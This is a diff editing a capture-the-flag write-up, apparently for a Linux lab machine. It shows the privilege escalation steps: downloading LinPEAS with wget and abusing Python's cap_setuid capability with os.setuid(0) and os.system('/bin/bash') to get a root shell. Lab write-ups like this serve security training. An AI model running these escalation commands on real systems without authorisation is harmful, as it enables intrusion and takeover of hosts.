@@ -71,7 +71,7 @@ The recovered credentials were also valid for SSH access, providing a more stabl
 
 ## 3. Privilege Escalation
 
-To be able to do this step I downloaded linpeas.sh from https://linpeas.org and followd the steps:
+To identify potential privilege escalation vectors, LinPEAS was downloaded and uploaded to the target system for further enumeration.
 1. `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
 2. `chmod +x linpeas.sh`
 
@@ -108,11 +108,11 @@ LinPEAS revealed that Python 3.8 had the `cap_setuid` capability assigned. This 
 
 <img width="629" height="80" alt="image" src="https://github.com/user-attachments/assets/5eda1493-9807-4063-b385-8b35f4b62fbc" />
 
-So to see if this acutally works, the decision to try it out was made by the following commands:
+To verify the finding, the following Python commands were executed:
 
 1. `/usr/bin/python3.8`
 2. `import os`
-3. `os.setupid(0)`
+3. `os.setuid(0)`
 4. `os.system("/bin/bash")`
 5. `whoami`
 
@@ -128,7 +128,7 @@ After gaining initial access to the system, I located and retrieved the user fla
 
 ### Root Flag
 
-After successfully escalating privileges to root, I retrieved the root flag from the Administrator desktop.
+After successfully escalating privileges to root, I retrieved the root flag.
 
 <img width="220" height="91" alt="image" src="https://github.com/user-attachments/assets/97aa9aa0-781a-4d13-bffd-773cf5720fbd" />
 
